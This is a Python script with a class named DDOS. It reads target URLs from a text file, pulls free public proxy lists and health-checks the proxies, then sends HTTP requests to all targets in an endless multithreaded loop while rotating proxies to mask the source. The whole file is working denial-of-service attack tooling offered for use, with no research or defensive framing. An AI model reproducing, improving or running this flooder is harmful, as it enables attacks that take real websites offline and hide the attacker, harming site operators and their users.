import json
import typing
import random
import logging
import asyncio
import urllib
import urllib.error
import urllib.parse
from threading import Lock
from urllib.request import urlopen, install_opener, build_opener, Request, ProxyHandler, CacheFTPHandler, HTTPBasicAuthHandler
from concurrent.futures import ThreadPoolExecutor

FORMAT = '%(asctime)s [%(levelname)s] >>> %(message)s'
logging.basicConfig(format=FORMAT, datefmt='%H:%M:%S', level=logging.INFO)
logger = logging.getLogger(__name__)


proxy_list_endpoints = [
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
]

global_proxy_list = []

lock = Lock()


class DDOS:
    def __init__(self):
        self.urls = []
        self.results = {}
        self.proxy_list = []

    @staticmethod
    def _fetch_proxy_from_url(url):
        httprequest = Request(url, headers={"Accept": "application/json"})

        try:
            with urlopen(httprequest, timeout=1) as response:
                logger.info("Fetching list of proxies...")

                resp_text = response.read().decode()
                _proxy_list = resp_text.split("\n")

                logger.info(f"Response status: {response.status}")
                # logger.info("Response text: \n{}".format(resp_text))
                logger.info(f"Length of proxy list: {len(_proxy_list)}")
        except urllib.error.URLError as e:
            logger.error(f"Cannot get proxy list. Error: {e}")
            return []
        # except Exception as e:
        #     logger.error(f"ERROR! E: {e}")
        #     return []

        return _proxy_list

    def fetch_proxy_list(self, url):
        proxy_list = []

        if isinstance(url, list):
            for single_url in url:
                _proxy_list = self._fetch_proxy_from_url(single_url)
                proxy_list += _proxy_list
        elif isinstance(url, str):
            proxy_list = self._fetch_proxy_from_url(url)
        else:
            raise ValueError('`url` parameter must be list or str')

        if proxy_list:
            self.proxy_list = proxy_list

        return proxy_list

    def healthcheck_proxy_v1(self, proxy, check_url='http://example.com', timeout=1):
        try:
            proxy = proxy.strip()  # remove all special characters
            logger.debug(f"Check proxy `{proxy}`")

            proxy_handler = urllib.request.ProxyHandler({'http': proxy})
            opener = urllib.request.build_opener(proxy_handler)
            urllib.request.install_opener(opener)
            req = urllib.request.Request(check_url)  # change the URL to test here
            urllib.request.urlopen(req, timeout=timeout)  # check proxy
        except urllib.error.HTTPError:
            raise ConnectionError(f"Healthcheck error! Proxy `{proxy}` is dead.")
        else:
            logger.debug(f"Proxy `{proxy}` is working.")

    @staticmethod
    def _install_proxy(proxy: str):
        assert isinstance(proxy, str), '`proxy` parameter must be string'

        # create all needed settings for proxy
        auth_info = HTTPBasicAuthHandler()
        proxy_support = ProxyHandler({"http": proxy.strip()})
        opener = build_opener(proxy_support, auth_info, CacheFTPHandler)

        # install proxy opener
        install_opener(opener)

    def request(self, url, proxy=None, timeout=1, loop_proxies=True):
        if not url.startswith("http"):
            # try to extract protocol prefix
            protocol = url.split(':')[0]
            raise ValueError(f"Unsupported protocol. `http` or `https` are supported, not {protocol}")

        if proxy:
            self._install_proxy(proxy)
        elif proxy is None and self.proxy_list:
            not_valid_proxy = True
            while not_valid_proxy:
                with lock:
                    proxy = self.proxy_list.pop(0)

                try:
                    self.healthcheck_proxy_v1(proxy)
                    with lock:
                        self.proxy_list.append(proxy)
                    not_valid_proxy = False
                except Exception as e:
                    logger.warning(f"Bad proxy. Delete it from proxy list. Error: {e}")

                    # break loop if flag is False
                    if loop_proxies is False:
                        break

        httprequest = Request(url, headers={"Accept": "application/json"})
        try:
            with urlopen(httprequest, timeout=timeout) as response:
                logger.info(f"Target: {url}")
                logger.info(f"Response status: {response.status}")
                # logger.info("Response text: \n{}".format(response.read().diecode()))
                try:
                    self.results[url][0] += 1
                except KeyError:
                    self.results[url] = [1, 0]
        except urllib.error.URLError as e:
            logger.error(f"Cannot access resource `{url}`. Error: {e}")
            try:
                self.results[url][1] += 1
            except KeyError:
                self.results[url] = [0, 1]

    def parse_txt(self, filename="targets.txt"):
        with open(filename, mode="r") as f:
            oneline = f.read()

        lines = oneline.split('\n')
        # lines = [line.split(" - ")[1] if len(line.split(" - ")) > 1 else "" for line in lines]

        urls = []
        for i, line in enumerate(lines):
            url = line.split(" - ")

            if len(url) > 1:
                url = url[-1]
            elif len(url) == 1:
                url = url[0]
            else:
                continue

            if not url:
                logger.info(f"Line {i}: Empty string. Pass...")
                continue

            if not url.startswith("http"):
                protocol = url.split(':')[0]
                logger.warning(f"Line {i}: Unsupported protocol. `http` or `https` are supported, not `{protocol}`")
                continue

            urls.append(url)

        self.urls = urls

        return urls

    async def ddos_async(self, max_workers=50):
        while True:
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                # Initialize the event loop
                loop = asyncio.get_event_loop()

                # Use list comprehension to create a list of
                # tasks to complete. The executor will run the `request`
                # function for each url in the urls list
                tasks = [
                    loop.run_in_executor(
                        executor,
                        self.request,
                        url
                    )
                    for url in self.urls
                ]

                # Initializes the tasks to run and awaits their results
                for response in await asyncio.gather(*tasks):
                    pass

                logger.info(f"Results: \n{self.results}")


if __name__ == '__main__':
    factory = DDOS()

    urls_ = factory.parse_txt()
    logger.info("Length: {} | Type: {}".format(len(urls_), type(urls_)))

    example_url = random.choice(urls_)
    # example_url = "https://google.com/"
    proxies_ = factory.fetch_proxy_list(proxy_list_endpoints)

    proxy_ = random.choice(proxies_)

    loop = asyncio.get_event_loop()
    future = asyncio.ensure_future(factory.ddos_async(max_workers=10))
    loop.run_until_complete(future)
